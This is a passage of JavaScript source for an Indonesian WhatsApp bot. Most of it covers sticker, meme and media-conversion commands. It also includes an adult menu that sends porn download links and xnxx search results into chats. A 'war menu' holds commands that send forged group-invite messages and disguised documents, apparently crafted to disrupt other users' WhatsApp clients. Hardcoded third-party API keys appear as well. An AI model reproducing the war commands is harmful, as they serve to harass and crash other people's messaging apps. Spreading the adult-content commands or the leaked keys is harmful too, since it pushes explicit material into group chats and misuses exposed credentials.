					`https://api.vhtear.com/textxgif?text=${q}&apikey=${setting.vhtearkey}`
				)
				.then(() =>
					console.log(
						'Success creating GIF!'
					))
				.catch(async (
					err
				) => {
					console
						.error(
							err
						)
					reply
						(
							'Error!'
						)
				})
			break
		case 'loliv':
		case 'lolivid':
		case 'lolivideo':
			reply(mess.wait)
			anu =
				await fetchText(
					'https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt'
				)
				.then(async (
					body
				) => {
					anu =
						body
						.split(
							'\n'
						)
					anu =
						anu[Math
							.floor(
								Math
								.random() *
								anu
								.length
							)
						]
					sendMediaURL
						(from,
							anu
						)
				})
				.catch(async (
					err
				) => {
					console
						.error(
							err
						)
					reply
						(
							`${err}`
						)
				})
			break
		case 'sticker':
		case 'stiker':
		case 's':
			//titidkau
			if (isMedia && !mek
				.message
				.videoMessage ||
				isQuotedImage) {
				const encmedia =
					isQuotedImage ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				const media =
					await Maslent
					.downloadAndSaveMediaMessage(
						encmedia,
						`./XNXXs1/${sender}`
					)
				await ffmpeg(
						`${media}`
					)
					.input(
						media)
					.on('start',
						function(
							cmd
						) {
							console
								.log(
									`Started : ${cmd}`
								)
						})
					.on('error',
						function(
							err
						) {
							console
								.log(
									`Error : ${err}`
								)
							fs.unlinkSync(
								media
							)
							reply
								(mess
									.error
									.api
								)
						})
					.on('end',
						function() {
							console
								.log(
									'Finish'
								)
							exec(`webpmux -set exif ./XNXXs1/data.exif ./XNXXs1/${sender}.webp -o ./XNXXs1/${sender}.webp`,
								async (
									error
								) => {
									if (
										error
									)
										return reply(
											mess
											.error
											.api
										)
									Maslent
										.sendMessage(
											from,
											fs
											.readFileSync(
												`./XNXXs1/${sender}.webp`
											),
											sticker, {
												quoted: mek
											}
										)
									fs.unlinkSync(
										media
									)
									fs.unlinkSync(
										`./XNXXs1/${sender}.webp`
									)
								})
						})
					.addOutputOptions(
						[`-vcodec`,
							`libwebp`,
							`-vf`,
							`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`
						])
					.toFormat(
						'webp')
					.save(
						`./XNXXs1/${sender}.webp`
					)
			} else if ((
					isMedia &&
					mek.message
					.videoMessage
					.fileLength <
					10000000 ||
					isQuotedVideo &&
					mek.message
					.extendedTextMessage
					.contextInfo
					.quotedMessage
					.videoMessage
					.fileLength <
					10000000)) {
				const encmedia =
					isQuotedVideo ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				const media =
					await Maslent
					.downloadAndSaveMediaMessage(
						encmedia,
						`./XNXXs1/${sender}`
					)
				reply(mess.wait)
				await ffmpeg(
						`${media}`
					)
					.inputFormat(
						media
						.split(
							'.'
						)[4]
					)
					.on('start',
						function(
							cmd
						) {
							console
								.log(
									`Started : ${cmd}`
								)
						})
					.on('error',
						function(
							err
						) {
							console
								.log(
									`Error : ${err}`
								)
							fs.unlinkSync(
								media
							)
							tipe =
								media
								.endsWith(
									'.mp4'
								) ?
								'video' :
								'gif'
							reply
								(mess
									.error
									.api
								)
						})
					.on('end',
						function() {
							console
								.log(
									'Finish'
								)
							exec(`webpmux -set exif ./XNXXs1/data.exif ./XNXXs1/${sender}.webp -o ./XNXXs1/${sender}.webp`,
								async (
									error
								) => {
									if (
										error
									)
										return reply(
											mess
											.error
											.api
										)
									Maslent
										.sendMessage(
											from,
											fs
											.readFileSync(
												`./XNXXs1/${sender}.webp`
											),
											sticker, {
												quoted: mek
											}
										)
									fs.unlinkSync(
										media
									)
									fs.unlinkSync(
										`./XNXXs1/${sender}.webp`
									)
								})
						})
					.addOutputOptions(
						[`-vcodec`,
							`libwebp`,
							`-vf`,
							`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`
						])
					.toFormat(
						'webp')
					.save(
						`./XNXXs1/${sender}.webp`
					)
			} else {
				reply(
					`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`
				)
			}
			break
		case 'take':
		case 'colong':
			if (!
				isQuotedSticker)
				return reply(
					'Stiker aja om'
				)
			encmedia = JSON
				.parse(JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			media =
				await Maslent
				.downloadAndSaveMediaMessage(
					encmedia)
			anu = args.join(' ')
				.split('|')
			satu = anu[0] !==
				'' ? anu[0] :
				`${pushname}`
			dua = typeof anu[
					1] !==
				'undefined' ?
				anu[1] : `UwU`
			require(
					'./XNXX1/fetch.js'
				)
				.createExif(
					satu, dua)
			require(
					'./XNXX1/fetch.js'
				)
				.modStick(media,
					Maslent,
					mek, from)
			break
		case 'delwm':
			if (!
				isQuotedSticker)
				return reply(
					'Stiker aja om'
				)
			encmedia = JSON
				.parse(JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			media =
				await Maslent
				.downloadAndSaveMediaMessage(
					encmedia)
			anu = args.join(' ')
				.split('|')
			satu = anu[0] !==
				'' ? anu[0] : ``
			dua = typeof anu[
					1] !==
				'undefined' ?
				anu[1] : ``
			require(
					'./XNXX1/fetch.js'
				)
				.createExif(
					satu, dua)
			require(
					'./XNXX1/fetch.js'
				)
				.modStick(media,
					Maslent,
					mek, from)
			break
		case 'stikerwm':
		case 'stickerwm':
		case 'swm':
			var a = arg.split(
				"|")[0];
			var b = arg.split(
				"|")[1];
			if (isMedia && !mek
				.message
				.videoMessage ||
				isQuotedImage) {
				const encmedia =
					isQuotedImage ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				media =
					await Maslent
					.downloadAndSaveMediaMessage(
						encmedia
					)
				await createExif
					(a, b)
				out = getRandom(
					'.webp')
				ffmpeg(media)
					.on('error',
						(e) => {
							console
								.log(
									e
								)
							Maslent
								.sendMessage(
									from,
									'Terjadi kesalahan',
									'conversation', {
										quoted: mek
									}
								)
							fs.unlinkSync(
								media
							)
						})
					.on('end',
						() => {
							_out =
								getRandom(
									'.webp'
								)
							spawn
								('webpmux',
									['-set',
										'exif',
										'./XNXXs1/data.exif',
										out,
										'-o',
										_out
									]
								)
								.on('exit',
									() => {
										Maslent
											.sendMessage(
												from,
												fs
												.readFileSync(
													_out
												),
												'stickerMessage', {
													quoted: mek
												}
											)
										fs.unlinkSync(
											out
										)
										fs.unlinkSync(
											_out
										)
										fs.unlinkSync(
											media
										)
									}
								)
						})
					.addOutputOptions(
						[`-vcodec`,
							`libwebp`,
							`-vf`,
							`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`
						])
					.toFormat(
						'webp')
					.save(out)
			} else if ((
					isMedia &&
					mek.message
					.videoMessage
					.seconds <
					11 ||
					isQuotedVideo &&
					mek.message
					.extendedTextMessage
					.contextInfo
					.quotedMessage
					.videoMessage
					.seconds <
					11) && args
				.length == 0) {
				const encmedia =
					isQuotedVideo ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				const media =
					await Maslent
					.downloadAndSaveMediaMessage(
						encmedia
					)
				pe = args.join(
					'')
				var a = pe
					.split("|")[
						0];
				var b = pe
					.split("|")[
						1];
				await createExif
					(a, b)
				out = getRandom(
					'.webp')
				ffmpeg(media)
					.on('error',
						(e) => {
							console
								.log(
									e
								)
							Maslent
								.sendMessage(
									from,
									'Terjadi kesalahan',
									'conversation', {
										quoted: mek
									}
								)
							fs.unlinkSync(
								media
							)
						})
					.on('end',
						() => {
							_out =
								getRandom(
									'.webp'
								)
							spawn
								('webpmux',
									['-set',
										'exif',
										'./XNXXs1/data.exif',
										out,
										'-o',
										_out
									]
								)
								.on('exit',
									() => {
										Maslent
											.sendMessage(
												from,
												fs
												.readFileSync(
													_out
												),
												'stickerMessage', {
													quoted: mek
												}
											)
										fs.unlinkSync(
											out
										)
										fs.unlinkSync(
											_out
										)
										fs.unlinkSync(
											media
										)
									}
								)
						})
					.addOutputOptions(
						[`-vcodec`,
							`libwebp`,
							`-vf`,
							`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`
						])
					.toFormat(
						'webp')
					.save(out)
			} else {
				reply(
					`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
				)
			}
			break
		case 'toimg':
			if (!
				isQuotedSticker)
				return reply(
					'reply stickernya'
				)
			reply(mess.wait)
			encmedia = JSON
				.parse(JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			media =
				await Maslent
				.downloadAndSaveMediaMessage(
					encmedia)
			ran = getRandom(
				'.png')
			exec(`ffmpeg -i ${media} ${ran}`,
				(err) => {
					fs.unlinkSync(
						media
					)
					if (err)
						return reply(
							'Gagal, pada saat mengkonversi sticker ke gambar'
						)
					buffer =
						fs
						.readFileSync(
							ran
						)
					Maslent
						.sendMessage(
							from,
							buffer,
							image, {
								quoted: mek,
								caption: 'Nih'
							}
						)
					fs.unlinkSync(
						ran
					)
				})
			break
		case 'smeme':
			reply(
				'Loading.... '
			)
			top = arg.split(
				'|')[0]
			bottom = arg.split(
				'|')[1]
			var imgbb = require(
				'imgbb-uploader'
			)
			if ((isMedia && !mek
					.message
					.videoMessage ||
					isQuotedImage ||
					isQuotedSticker
				) && args
				.length > 0) {
				ger =
					isQuotedImage ||
					isQuotedSticker ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				owgi =
					await Maslent
					.downloadAndSaveMediaMessage(
						ger)
				anu =
					await imgbb(
						"cedeb44b8d204947a6833ca1412ca77d",
						owgi)
				teks =
					`${anu.display_url}`
				ranp =
					getRandom(
						'.gif')
				rano =
					getRandom(
						'.webp')
				anu1 =
					`https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
				sendStickerUrl(
					from,
					`${anu1}`
				)
			} else {
				reply(
					'Gunakan foto/stiker!'
				)
			}
			break
		case "autojoin":
			if (!isGroup)
				return reply(
					"Khusus di grup"
				);
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess.own
				)
			if (args[0] ==
				"on") {
				if (autojoin ==
					true)
					return reply(
						"Sudah aktif!!"
					);
				autojoin = true;
				reply(
					"Sukses mengaktifkan autojoin!"
				);
			} else if (args[
					0] ==
				"off") {
				autojoin =
					false;
				reply(
					"Sukses mematikan autojoin!"
				);
			} else if (!q) {

			}
			break;

		case 'memeimg':
		case 'memegen':
			top = arg.split(
				'|')[0]
			bottom = arg.split(
				'|')[1]
			var imgbb = require(
				'imgbb-uploader'
			)
			if ((isMedia && !mek
					.message
					.videoMessage ||
					isQuotedImage ||
					isQuotedSticker
				) && args
				.length > 0) {
				reply(mess.wait)
				ger =
					isQuotedImage ||
					isQuotedSticker ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				owgi =
					await Maslent
					.downloadAndSaveMediaMessage(
						ger)
				anu =
					await imgbb(
						"39d895963468b814fad0514bd28787e2",
						owgi)
				teks =
					`${anu.display_url}`
				ranp =
					getRandom(
						'.gif')
				rano =
					getRandom(
						'.webp')
				anu1 =
					`https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
				sendMediaURL(
					from,
					`${anu1}`,
					mess
					.success
				)
			} else {
				reply(
					'Gunakan foto/stiker!'
				)
			}
			break
		case 'togif':
			if ((isMedia && !mek
					.message
					.videoMessage ||
					isQuotedSticker
				) && args
				.length == 0) {
				reply(mess.wait)
				encmediaaa =
					isQuotedSticker ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				mediaaa =
					await Maslent
					.downloadAndSaveMediaMessage(
						encmediaaa
					)
				a = await webp2gifFile(
					mediaaa)
				mp4 =
					await getBuffer(
						a.result
					)
				Maslent
					.sendMessage(
						from,
						mp4,
						video, {
							mimetype: 'video/gif',
							quoted: mek,
							caption: mess
								.success
						})
				fs.unlinkSync(
					mediaaa)
			} else {
				reply(mess
					.wrongFormat
				)
			}
			break
		case 'tovideo':
			if ((isMedia && !mek
					.message
					.videoMessage ||
					isQuotedSticker
				) && args
				.length == 0) {
				reply(mess.wait)
				encmediaaa =
					isQuotedSticker ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				mediaaa =
					await Maslent
					.downloadAndSaveMediaMessage(
						encmediaaa
					)
				a = await webp2gifFile(
					mediaaa)
				mp4 =
					await getBuffer(
						a.result
					)
				Maslent
					.sendMessage(
						from,
						mp4,
						video, {
							mimetype: 'video/mp4',
							quoted: mek,
							caption: mess
								.success
						})
				fs.unlinkSync(
					mediaaa)
			} else {
				reply(mess
					.wrongFormat
				)
			}
			break
		case 'tomp3':
			if (isQuotedVideo ||
				isQuotedAudio) {
				reply(mess.wait)
				encmedia = JSON
					.parse(JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo
				media =
					await Maslent
					.downloadAndSaveMediaMessage(
						encmedia
					)
				ran = getRandom(
					'.mp3')
				exec(`ffmpeg -i ${media} ${ran}`,
					(
						err
					) => {
						fs.unlinkSync(
							media
						)
						if (
							err
						)
							return reply(
								`Err: ${err}`
							)
						buffer453
							=
							fs
							.readFileSync(
								ran
							)
						Maslent
							.sendMessage(
								from,
								buffer453,
								audio, {
									mimetype: 'audio/mp4',
									quoted: mek
								}
							)
						fs.unlinkSync(
							ran
						)
					})
			} else {
				reply(mess
					.wrongFormat
				)
			}
			break


			//---------------------<RANDOMGAMBAR>_-----------

			//------------------<18+ Menu>-----------------------   
		case 'randombokep':
			bokep = body.slice(
				1)
			const bo = [
				'https://www.mediafire.com/download/8hnhjcf3pseubgy',
				'https://www.mediafire.com/download/cty9phda3d1s62u',
				'https://www.mediafire.com/download/8hnhjcf3pseubgy'
			]
			const kep = bo[Math
				.floor(Math
					.random() *
					bo
					.length)
			]
			Maslent.sendMessage(
				from,
				'*PERMINTAAN:* ' +
				bokep +
				'\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* ' +
				kep, text, {
					quoted: ftoko,
					caption: `NI BOKEP SAYA DAPAT DARI *©KurrXd* DOSA TANGGUNG SENDIRI🗿`
				})
			break
		case 'xnxx':
			if (args.length ==
				0) return reply(
				`Contoh: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`
			)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/xnxx?apikey=genbotkey&url=${query}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				`Title : ${get_result.title}\n`
			ini_txt +=
				`Duration : ${get_result.duration}\n`
			ini_txt +=
				`View : ${get_result.view}\n`
			ini_txt +=
				`Rating : ${get_result.rating}\n`
			ini_txt +=
				`Like : ${get_result.like}\n`
			ini_txt +=
				`Dislike : ${get_result.dislike}\n`
			ini_txt +=
				`Comment : ${get_result.comment}\n`
			ini_txt +=
				`Tag : ${get_result.tag.join(", ")}\n`
			ini_txt +=
				`Description : ${get_result.description}\n`
			ini_txt +=
				"Link : \n"
			ini_link =
				get_result.link
			for (var x of
					ini_link) {
				ini_txt +=
					`${x.type} - ${x.link}\n\n`
			}
			thumbnail =
				await getBuffer(
					get_result
					.thumbnail)
			Maslent.sendMessage(
				from,
				thumbnail,
				image, {
					quoted: mek,
					caption: ini_txt
				})
			break
		case 'xnxxsearch':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} Japanese`
			)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/xnxxsearch?apikey=SimpelKey&query=${query}`
				)
			get_result =
				get_result
				.result
			/*    ini_txt = ""
			      for (var x of get_result) {
			          ini_txt += `Title : ${x.title}\n` 
			          ini_txt += `Views : ${x.views}\n`
			          ini_txt += `Duration : ${x.duration}\n`
			          ini_txt += `Uploader : ${x.uploader}\n`
			          ini_txt += `Link : ${x.link}\n`                        
			      } 
			      let yah = `${ini_txt}`*/
			list = []
			nombor = 1
			startnum = 0
			for (var x of
					get_result) {
				const yy = {
					title: `Title Ke` +
						nombor++,
					rows: [
					{
						title: `${x.title}${[startnum++]}`,
						description: `Duration: ${x.duration}\nViews: ${x.views}\nUpload: ${x.uploader}`,
						rowId: `${prefix}xnxxdown ${x.link}`
					}]
				}
				list.push(yy)
			}
			listmsg(from,
				`${ucapanWaktu}`,
				`Hai kak.....\n*${pushname}*\nSilahkan Pilih Salah Satu Title Untuk Mendownload\n*Note*: ${Mslntptk}Premium User${Mslntptk}`,
				list)
			break

		case 'asupan1':
			Maslent
				.updatePresence(
					from,
					Presence
					.composing)
			reply(mess.wait)
			data = fs
				.readFileSync(
					'./XNXX1/asupan.js'
				);
			jsonData = JSON
				.parse(data);
			randIndex = Math
				.floor(Math
					.random() *
					jsonData
					.length);
			randKey = jsonData[
				randIndex];
			asupan =
				await getBuffer(
					randKey
					.result)
			Maslent.sendMessage(
				from,
				asupan,
				video, {
					quoted: mek,
					caption: '```ASUPAN NIH:V```'
				})
			break
		case 'asupan2':
			Maslent
				.updatePresence(
					from,
					Presence
					.composing)
			reply(mess.wait)
			data = fs
				.readFileSync(
					'./XNXX1/asupan2.js'
				);
			jsonData = JSON
				.parse(data);
			randIndex = Math
				.floor(Math
					.random() *
					jsonData
					.length);
			randKey = jsonData[
				randIndex];
			asupan =
				await getBuffer(
					randKey
					.result)
			Maslent.sendMessage(
				from,
				asupan,
				video, {
					quoted: mek,
					caption: '```ASUPAN NIH:V```'
				})
			break
			//------------------<WAR MENU>---------------    
		case 'pvp':
			if (!mek.key
				.fromMe && !
				isOwner) return
			tapib1 = fs
				.readFileSync(
					'./XNXXs2/audio/numayei.mp3'
				)
			Maslent.sendMessage(
				from,
				tapib1,
				document, {
					quoted: mek,
					filename: `${botname} ~ 404 ${vipi}.mp3`,
					mimetype: 'audio/application'
				})
			await reply(
				'Bang mau nanya'
			)
			break
		case 'pgp':
			if (!isOwner && !mek
				.key.fromMe)
				return
			buf = Mfake
			imeu = await Maslent
				.prepareMessage(
					'0@s.whatsapp.net',
					buf, image)
			imeg = imeu.message
				.imageMessage
			res = await Maslent
				.prepareMessageFromContent(
					from, {
						"groupInviteMessage": {
							"groupJid": "85296556573-1328272333@g.us",
							"inviteCode": "wFHwtOxGQN8OwK2x",
							"inviteExpiration": "162533333338378",
							"groupName": `${botname} ~ 404 ${vipi}`,
							"jpegThumbnail": "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